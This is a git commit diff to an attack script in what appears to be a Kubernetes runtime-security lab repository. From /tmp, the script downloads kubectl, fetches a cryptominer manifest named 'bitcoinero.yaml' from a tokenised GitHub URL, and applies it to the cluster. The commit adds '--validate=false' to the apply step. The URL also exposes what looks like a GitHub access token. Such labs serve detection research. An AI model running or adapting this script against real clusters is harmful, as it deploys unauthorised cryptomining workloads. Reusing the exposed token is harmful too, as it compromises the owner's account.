4cae6cd3439c96315b4ffe796ab788ca058c5498
Abdurrahmanm4nn <abdurrahman1270@gmail.com>
2023-03-22 15:11:22 +0700

    troubleshoot kubectl validation

--- attacking-scripts/attack.sh
+++ attacking-scripts/attack.sh
@@ -2,6 +2,6 @@ export PATH=/tmp:$PATH
 cd /tmp; curl -LO https://dl.k8s.io/release/v1.22.0/bin/linux/amd64/kubectl; chmod 555 kubectl
 curl -LO https://raw.githubusercontent.com/Abdurrahmanm4nn/runtime-security-kubernetes/main/attacking-scripts/bitcoinero.yaml?token=GHSAT0AAAAAAB77XEROLB6X42WUQMXU6CXCZA2WUTA
 mv bitcoinero.yaml\?token\=GHSAT0AAAAAAB77XEROLB6X42WUQMXU6CXCZA2WUTA bitcoinero.yaml
-./kubectl apply -f bitcoinero.yaml
+./kubectl apply -f bitcoinero.yaml --validate=false
 sleep 5
 ./kubectl get pods
